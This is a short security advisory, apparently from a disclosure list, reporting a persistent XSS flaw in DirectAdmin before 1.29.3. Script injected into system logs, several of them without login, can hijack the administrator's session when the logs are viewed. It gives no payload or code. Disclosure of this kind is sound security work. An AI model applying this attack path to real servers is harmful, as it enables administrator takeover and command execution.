Subject: DirectAdmin persistant XSS [takeover an Administrator`s account]

+ Subject:
DirectAdmin persistant XSS [takeover an Administrator`s account]

+ Version:
< DirectAdmin 1.29.3

+ Discovered by:
Kanedaaa: http://kaneda.bohater.net

+ DirectAdmin Description:
DirectAdmin is a popular, advanced Web Control Panel with many features 
for webhosting. www.directadmin.com

+ Persistant XSS Description:
It is possible to take over an Administrator`s account by injecting 
persistent XSS data to the System Logs [/var/log/*].
When DirectAdmin's Administrator goes to Admin Tools/Log Viewer and press 
"Show log" to display logs - he can be a victim of XSS attack and his 
session can be easily taken over - which means that it is possible to run 
any command with DirectAdmin's Administrator priviliges.

I found out that 7 from 15 log files in the menu, could be used as means 
of injecting XSS to a system with no login credentials required.
Next 3 of them are possible to be injected when you are logged as a valid 
user in the DirectAdmin.

I was testing DirectAdmin on default Debian 4.0 installation but in 
general it should be working for other platforms too (with small changes I 
guess).
